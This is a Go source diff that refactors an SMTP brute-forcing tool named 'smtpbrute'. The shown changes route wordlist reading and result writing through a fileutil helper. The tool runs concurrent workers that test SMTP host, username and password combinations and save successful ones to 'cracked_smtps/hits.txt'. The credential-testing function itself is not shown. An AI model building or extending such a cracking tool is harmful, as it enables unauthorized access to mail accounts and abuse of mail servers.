@@ -2,6 +2,7 @@ package smtpbrute
 
 import (
 	"fmt"
+	"go_cli/fileutil"
 	"strings"
 	"sync"
 
@@ -22,10 +23,9 @@ func BruteSmtp() {
 		fmt.Printf("err: %v\n", err)
 	}
 	fmt.Printf("filePath: %v\n", filePath)
-	wordList, _ := ReadCredsFromFile(filePath)
+	wordList, _ := fileutil.ReadFromFile(filePath)
 	fmt.Printf("len(wordList): %v\n", len(wordList))
 	testEmail = strings.TrimSpace(testEmail)
-
 	red := color.New(color.FgRed).PrintlnFunc()
 	red("SMTP Host\t\tPort\t\tUsername\t\tPassword")
 	red("-------------------------------------------------------------------")
@@ -42,13 +42,13 @@ func BruteSmtp() {
 	}
 	wordListChunks := make(chan []string, chunkSize)
 
-	file := WriteResultsToFile()
+	file := fileutil.WriteToFile("cracked_smtps", "hits.txt")
 	defer file.Close()
 
 	// spawn goroutines which will be reading data from the ipChunks channel concurrently.
 	for i := 0; i < maxWorkers; i++ {
 		wg.Add(1)
-		go ProcessCredentials(wordListChunks, &file, i, testEmail, &mutex, &wg, &totlChecks)
+		go ProcessCredentials(wordListChunks, file, i, testEmail, &mutex, &wg, &totlChecks)
 	}
 
 	// share wordlist among goroutines by sending calculated chunk data size to worker channel.
